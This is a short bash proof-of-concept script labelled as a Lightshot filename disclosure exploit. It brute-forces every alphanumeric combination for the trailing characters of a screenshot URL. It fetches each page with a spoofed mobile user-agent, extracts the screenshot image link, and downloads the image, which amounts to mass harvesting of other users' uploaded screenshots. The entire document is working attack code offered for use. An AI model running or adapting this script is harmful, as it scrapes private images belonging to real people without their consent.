#!/bin/bash

# Lightshot filename disclosure POC
# @Discovered by : Naïm GALLOUJ
# @Author : Charles SENGES

url=$1
row=$2

if (($# != 2)); then
	echo "2 arguments expected"
	exit 1;
fi
nbcar=$(echo $url | wc -c)
cuturl=$(echo $url | head -c $(($nbcar - $row - 1)))
charset=({a..z} {0..9})
alphabet=""
echo $cuturl
echo $nbcar
echo "Downloading "$(echo "36 ^ $row" | bc)" images from $url ..."
echo ""

permute(){
  (($1 == 0)) && { alphabet=$alphabet" $2"; return; }
  for char in "${charset[@]}"
  do
    permute "$((${1} - 1 ))" "$2$char"
  done
}

permute "$row"

for a in $alphabet;     do
        tmp=$(wget  $cuturl$a -nv -U "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -O-)
        wget -nv $(echo $tmp | grep -o '<img class="no-click screenshot-image" [ ]*src="[^"]*"' | cut -d '"' -f 4)
done